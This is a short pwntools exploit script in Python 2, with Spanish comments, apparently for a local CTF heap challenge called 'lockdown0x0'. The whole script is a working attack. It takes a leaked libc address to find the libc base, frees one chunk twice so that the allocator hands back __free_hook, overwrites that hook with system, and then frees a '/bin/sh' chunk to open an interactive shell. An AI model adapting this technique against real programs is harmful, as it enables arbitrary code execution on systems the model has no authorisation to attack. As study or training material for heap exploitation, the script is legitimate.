#!/usr/bin/python2
from pwn import *
#exploit template para lockdown0x0
#info del binario
elf = ELF('./bin')
libc = elf.libc
#script para gdb
gs = '''
continue
'''
#funcion de start, usa argumentos para ejecutarse
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
#global index
index = 0
#partiendo el binario
r = start()
r.timeout = 0.1
#funcion para usar malloc (allocate)
def malloc(size, data):
    global index
    r.sendline("1")
    r.sendlineafter("size : ", str(size))
    r.sendafter("data : ", data)
    r.recvuntil(">")
    index += 1
    return index - 1
#funcion para usar free(delete)
def free(idx):
    r.sendline("2")
    r.sendlineafter("index :", str(idx))
    r.recvuntil(">")

#==== Exploit aca =====
#leak
r.recvuntil("regalito : ")
leak = int(r.recvline(), 16)
log.info("leak = {}".format(hex(leak)))
libc.address = leak - 0x6df20
log.info("libc = {}".format(hex(libc.address)))

#exploit

a = malloc(24, "AAAAAAA")
b = malloc(24, "/bin/sh\0")

free(a)
free(a)

c = malloc(24, p64(libc.sym.__free_hook))
d = malloc(24, "DDDDDDDD")
win = malloc(24, p64(libc.sym.system))

free(b)

#==== interactive =====
r.interactive()

